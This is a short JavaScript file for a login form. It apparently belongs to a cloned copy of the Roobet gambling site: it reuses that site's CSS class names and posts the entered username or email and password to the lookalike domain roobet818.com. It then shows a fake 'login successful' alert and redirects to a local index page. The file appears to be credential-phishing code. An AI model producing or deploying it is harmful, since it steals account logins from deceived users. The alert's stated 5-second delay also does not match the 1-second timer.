document.addEventListener('DOMContentLoaded', function () {
    const signupForm = document.getElementById('signupForm');
  
    if (signupForm) {
        const playNowButton = document.querySelector('.css-tqtxkk'); 
  
        if (playNowButton) {
            playNowButton.addEventListener('click', function (event) {
                event.preventDefault();
  
                // Get values from input fields
                const usernameOrEmail = document.getElementById('auth-dialog-username').value;
                const password = document.getElementById('auth-dialog-Password').value;
  
                const data = {
                    identifier: usernameOrEmail,
                    password: password
                };
  
                // Send a POST request to the backend
                fetch('https://roobet818.com/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data), // Ensure the data is properly stringified
                })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Success:', data);

                        // Check if login was successful
                        if (data.token) {
                            // Show alert for successful login
                            alert('Login successful! Redirecting to home page in 5 seconds.');

                            // Redirect to the home page after 5 seconds
                            setTimeout(function () {
                                window.location.href = './index.html'; // Replace with the actual path of your home page
                            }, 1000);
                        } else {
                            // Handle unsuccessful login (e.g., show an error message to the user)
                            console.error('Login failed:', data.message);
                        }
                    })
                    .catch((error) => {
                        console.error('Error:', error);
                    });
            });
        }
    }
});

document.addEventListener('DOMContentLoaded', function () {
    // Assuming you have a button element as described in your HTML
    const togglePasswordButton = document.querySelector('.MuiIconButton-root-553');

    if (togglePasswordButton) {
        togglePasswordButton.addEventListener('click', function () {
            // Get the password input field
            const passwordInput = document.getElementById('auth-dialog-Password');

            // Toggle the type attribute of the password input between 'password' and 'text'
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });
    }
});
